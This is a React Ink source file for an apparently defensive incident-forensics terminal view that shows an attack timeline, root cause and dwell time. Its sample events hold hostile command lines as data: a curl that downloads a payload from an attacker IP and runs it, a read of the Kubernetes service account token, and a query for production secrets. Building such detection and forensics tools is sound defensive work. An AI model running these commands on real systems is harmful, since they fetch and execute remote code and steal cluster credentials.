/**
 * VIGILANTE Interactive Terminal Attack Timeline & Causal DAG Explorer
 * React Ink terminal view enabling operators to traverse attack sequences,
 * trace causal parent-child processes, isolate root cause, and evaluate dwell time.
 */

import React, { useState, useMemo } from 'react';
import { Box, Text, useInput, useApp } from 'ink';
import { useTheme } from './theme.js';
import {
  buildCausalTimeline,
  identifyRootCause,
  calculateDwellTime,
  renderAsciiTimeline
} from '../engine/timeline.js';

export function TimelineView({ onReturn = null, initialEvents = null }) {
  const theme = useTheme();
  const { exit } = useApp();

  const defaultEvents = useMemo(() => [
    {
      id: 'evt-1',
      timestamp: Date.now() - 120000,
      type: 'NETWORK_INGRESS',
      title: 'Inbound Ingress Connection on Port 8080',
      entity: 'ingress-nginx',
      srcIp: '198.51.100.42',
      dstPort: 8080,
      mitreTechnique: 'T1190',
      severity: 'MEDIUM',
      sourceModule: 'suricata',
      message: 'External connection to web frontend API'
    },
    {
      id: 'evt-2',
      timestamp: Date.now() - 115000,
      type: 'PROCESS_EXEC',
      title: 'Vulnerable SpringBoot WebShell Invocation',
      entity: 'web-frontend',
      pid: 1042,
      ppid: 1,
      command: '/bin/sh -c curl -O http://198.51.100.42/payload.elf',
      file: 'payload.elf',
      mitreTechnique: 'T1505.003',
      severity: 'CRITICAL',
      sourceModule: 'falco',
      message: 'Spawned shell command from JVM worker process'
    },
    {
      id: 'evt-3',
      timestamp: Date.now() - 95000,
      type: 'FILE_WRITE_THEN_EXEC',
      title: 'Payload Dropped & Chmod Execution',
      entity: 'web-frontend',
      pid: 1088,
      ppid: 1042,
      command: 'chmod +x /tmp/payload.elf && /tmp/payload.elf',
      file: '/tmp/payload.elf',
      mitreTechnique: 'T1059.004',
      severity: 'CRITICAL',
      sourceModule: 'falco',
      message: 'Executed downloaded binary in temporary folder'
    },
    {
      id: 'evt-4',
      timestamp: Date.now() - 60000,
      type: 'CREDENTIAL_DUMP',
      title: 'Kubernetes ServiceAccount Token Exfiltration',
      entity: 'web-frontend',
      pid: 1088,
      ppid: 1042,
      command: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
      mitreTechnique: 'T1003',
      severity: 'HIGH',
      sourceModule: 'auditd',
      message: 'Read cluster JWT service account token'
    },
    {
      id: 'evt-5',
      timestamp: Date.now() - 20000,
      type: 'LATERAL_MOVEMENT',
      title: 'API Server Query to Secrets Vault',
      entity: 'kube-apiserver',
      pid: 1205,
      command: 'curl -k https://kubernetes.default/api/v1/namespaces/prod/secrets',
      mitreTechnique: 'T1021',
      severity: 'CRITICAL',
      sourceModule: 'wazuh',
      message: 'Unauthorized access to production namespace database credentials'
    }
  ], []);

  const dag = useMemo(() => {
    return buildCausalTimeline(initialEvents || defaultEvents);
  }, [initialEvents, defaultEvents]);

  const [selectedIndex, setSelectedIndex] = useState(0);
  const [showBranchesOnly, setShowBranchesOnly] = useState(false);

  const selectedNode = dag.nodes[selectedIndex] || dag.nodes[0];
  const rootCause = useMemo(() => identifyRootCause(dag), [dag]);
  const dwellTime = useMemo(() => calculateDwellTime(dag), [dag]);

  useInput((input, key) => {
    if (key.escape || input === 'q') {
      if (typeof onReturn === 'function') {
        onReturn();
      } else {
        exit();
      }
      return;
    }

    if (key.upArrow || input === 'k') {
      setSelectedIndex(idx => Math.max(0, idx - 1));
    }
    if (key.downArrow || input === 'j') {
      setSelectedIndex(idx => Math.min(dag.nodes.length - 1, idx + 1));
    }

    // Toggle branches
    if (input === 'b' || input === 'B') {
      setShowBranchesOnly(v => !v);
    }
  });

  const getSeverityColor = (sev) => {
    switch (sev) {
      case 'CRITICAL': return 'red';
      case 'HIGH': return 'yellow';
      case 'MEDIUM': return 'cyan';
      default: return 'gray';
    }
  };

  const outgoingEdges = selectedNode ? (dag.adjacency.get(selectedNode.id) || []) : [];

  return React.createElement(
    Box,
    { flexDirection: 'column', width: '100%' },

    // Header Bar
    React.createElement(
      Box,
      {
        justifyContent: 'space-between',
        borderStyle: 'double',
        borderColor: theme.border || 'cyan',
        paddingX: 1,
        marginBottom: 1
      },
      React.createElement(
        Box,
        null,
        React.createElement(Text, { bold: true, color: 'cyan' }, '⚡ VIGILANTE ATTACK TIMELINE & CAUSAL DAG '),
        React.createElement(Text, { color: 'gray' }, '| Multi-Stage Forensic Causality Analysis')
      ),
      React.createElement(
        Box,
        null,
        React.createElement(Text, { color: 'yellow', bold: true }, `Events: ${dag.nodes.length} `),
        React.createElement(Text, { color: 'gray' }, `| Causal Links: ${dag.edges.length} | `),
        React.createElement(Text, { color: 'magenta', bold: true }, `Dwell Time: ${dwellTime.dwellTimeString}`)
      )
    ),

    // Navigation hotkeys
    React.createElement(
      Box,
      { flexDirection: 'row', paddingX: 1, marginBottom: 1 },
      React.createElement(Text, { color: 'yellow', bold: true }, '[↑/↓ or j/k] '),
      React.createElement(Text, { color: 'white' }, 'Select Event  '),
      React.createElement(Text, { color: 'cyan', bold: true }, '[b] '),
      React.createElement(Text, { color: 'white' }, `Toggle Branches (${showBranchesOnly ? 'ONLY' : 'ALL'})  `),
      React.createElement(Text, { color: 'gray' }, '[q/Esc] Return to Hub')
    ),

    // Split Content Pane
    React.createElement(
      Box,
      { flexDirection: 'row', width: '100%' },

      // Left Column: Chronological Event List
      React.createElement(
        Box,
        {
          flexDirection: 'column',
          width: '50%',
          borderStyle: 'single',
          borderColor: 'gray',
          paddingX: 1
        },
        React.createElement(
          Text,
          { bold: true, color: 'cyan', marginBottom: 1 },
          `CHRONOLOGICAL INCIDENT EVENTS (${dag.nodes.length})`
        ),
        dag.nodes.map((node, idx) => {
          const isSelected = idx === selectedIndex;
          const isRoot = node.id === rootCause.rootCauseNode?.id;
          const sevColor = getSeverityColor(node.severity);

          return React.createElement(
            Box,
            { key: node.id, flexDirection: 'row', justifyContent: 'space-between' },
            React.createElement(
              Text,
              { color: isSelected ? 'cyan' : 'white', bold: isSelected },
              `${isSelected ? '▶ ' : '  '}${isRoot ? '★ ' : ''}[#${node.index}] ${node.title.substring(0, 32)}`
            ),
            React.createElement(
              Text,
              { color: sevColor },
              `[${node.severity}]`
            )
          );
        })
      ),

      // Right Column: Causality & Root Cause Inspector
      React.createElement(
        Box,
        {
          flexDirection: 'column',
          width: '50%',
          borderStyle: 'single',
          borderColor: 'cyan',
          paddingX: 1,
          marginLeft: 1
        },
        React.createElement(
          Text,
          { bold: true, color: 'magenta', marginBottom: 1 },
          'CAUSAL ROOT-CAUSE INSPECTOR'
        ),
        React.createElement(
          Text,
          { color: 'yellow', bold: true },
          `Root Cause Entry: ${rootCause.rootCauseNode?.title || 'Unknown'}`
        ),
        React.createElement(
          Text,
          { color: 'gray' },
          `Attribution Confidence: ${(rootCause.confidence * 100).toFixed(0)}% | Cascade Reach: ${rootCause.cascadeLength} events`
        ),
        React.createElement(Box, { height: 1 }),
        selectedNode && React.createElement(
          Box,
          { flexDirection: 'column' },
          React.createElement(Text, { color: 'cyan', bold: true }, `Selected: [#${selectedNode.index}] ${selectedNode.title}`),
          React.createElement(Text, { color: 'white' }, `Target Entity:    ${selectedNode.entity}`),
          React.createElement(Text, { color: 'white' }, `MITRE Technique:  ${selectedNode.mitreTechnique || 'None'}`),
          selectedNode.command && React.createElement(Text, { color: 'yellow' }, `Command Line:     ${selectedNode.command}`),
          React.createElement(Text, { color: 'gray' }, `Details:          ${selectedNode.details}`),
          React.createElement(Box, { height: 1 }),
          React.createElement(Text, { color: 'green', bold: true }, `Downstream Causality (${outgoingEdges.length}):`),
          outgoingEdges.length === 0 
            ? React.createElement(Text, { color: 'gray' }, '  └─ Terminal event in attack branch (no further causality)')
            : outgoingEdges.map((edge, i) => (
                React.createElement(
                  Text,
                  { key: i, color: 'white' },
                  `  ├─► [${edge.type}] ➔ ${edge.description}`
                )
              ))
        )
      )
    )
  );
}
